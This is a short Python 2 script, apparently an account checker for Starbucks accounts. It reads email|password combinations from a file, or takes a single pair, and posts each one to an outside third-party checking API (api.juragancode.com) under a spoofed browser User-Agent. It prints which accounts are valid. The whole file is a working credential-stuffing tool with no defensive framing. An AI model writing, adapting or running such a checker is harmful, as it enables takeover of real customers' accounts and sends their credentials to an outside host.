# /usr/lib/python
# Kirnath x ZeroByte.ID

import requests
import sys
import time
import json

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print "Choose Service\n1. Mass Checking\n2. Single Check"
data = int(raw_input("Choose: "))
url = "http://api.juragancode.com/sbux.php"
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
			'Accept': '*/*'}
if data == 1:
	print "[+] Starting Engine..."
	time.sleep(2)
	file = str(raw_input("[+] Enter File Name: "))
	x = open(file, "r")
	read = x.read().split("\n")
	for i in read:
		params={'ajax':'1',
				'do': 'check',
				'data':'%s'%i}
		s = requests.Session()
		do = s.post(url, params, headers=headers)
		respon = do.text
		result = json.loads(respon)
		colorized = result["error"]
		if colorized ==0 :
			print bcolors.OKGREEN + result["msg"]
		else:
			print bcolors.FAIL + result["msg"]
if data ==2:
	file = str(raw_input("[+] Email: "))
	file2 = str(raw_input("[+] Password: "))
	i = file+"|"+file2
	params = {'ajax':'1',
				'do': 'check',
				'data':'%s'%i}
	s = requests.Session()
	do = s.post(url, params, headers=headers)
	respon = do.text
	result = json.loads(respon)
	colorized = result["error"]
	if colorized ==0 :
		print bcolors.OKGREEN + result["msg"]
	else:
		print bcolors.FAIL + result["msg"]